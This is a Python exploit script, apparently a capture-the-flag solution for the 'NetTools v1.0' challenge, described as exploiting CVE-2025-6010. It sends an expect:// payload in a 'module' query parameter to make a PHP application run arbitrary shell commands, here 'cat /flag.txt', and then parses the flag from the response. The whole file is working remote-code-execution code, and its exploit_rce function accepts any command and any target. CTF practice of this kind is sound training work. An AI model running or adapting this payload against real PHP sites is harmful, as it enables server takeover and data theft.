#!/usr/bin/env python3
"""
Exploit for CVE-2025-6010: PHP Expect Wrapper RCE
Challenge: NetTools v1.0 - Securinets Quals 2025
"""

import requests
import sys
import re
from urllib.parse import quote

def banner():
    print("=" * 60)
    print("  CVE-2025-6010 Exploit - PHP Expect Wrapper RCE")
    print("  Challenge: NetTools v1.0")
    print("=" * 60)
    print()

def exploit_rce(url, command):
    """Execute arbitrary command via expect:// wrapper"""
    payload = f"expect://{command}"
    
    params = {'module': payload}
    
    try:
        print(f"[*] Target: {url}")
        print(f"[*] Command: {command}")
        print(f"[*] Payload: {payload}")
        print()
        
        response = requests.get(url, params=params, timeout=10)
        
        if response.status_code == 200:
            return response.text
        else:
            print(f"[-] HTTP Error: {response.status_code}")
            return None
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Connection Error: {e}")
        return None

def extract_flag(html_content):
    """Extract flag from HTML response"""
    # Look for flag pattern
    flag_pattern = r'Securinets\{[^}]+\}'
    match = re.search(flag_pattern, html_content)
    
    if match:
        return match.group(0)
    return None

def main():
    banner()
    
    # Parse arguments
    if len(sys.argv) < 2:
        target = "http://localhost:8080"
        print(f"[!] No target specified, using default: {target}")
    else:
        target = sys.argv[1]
    
    # Verify target is accessible
    print("[*] Verifying target accessibility...")
    try:
        test = requests.get(target, timeout=5)
        if test.status_code == 200:
            print("[+] Target is accessible!")
        else:
            print(f"[-] Target returned status {test.status_code}")
            sys.exit(1)
    except:
        print("[-] Cannot reach target!")
        sys.exit(1)
    
    print()
    
    # Exploit: Read flag
    print("[*] Attempting to read /flag.txt...")
    result = exploit_rce(target, "cat /flag.txt")
    
    if result:
        flag = extract_flag(result)
        if flag:
            print()
            print("=" * 60)
            print(f"[+] FLAG FOUND: {flag}")
            print("=" * 60)
        else:
            print("[-] Flag not found in response")
            print("[*] Raw response preview:")
            print(result[:500])
    else:
        print("[-] Exploit failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
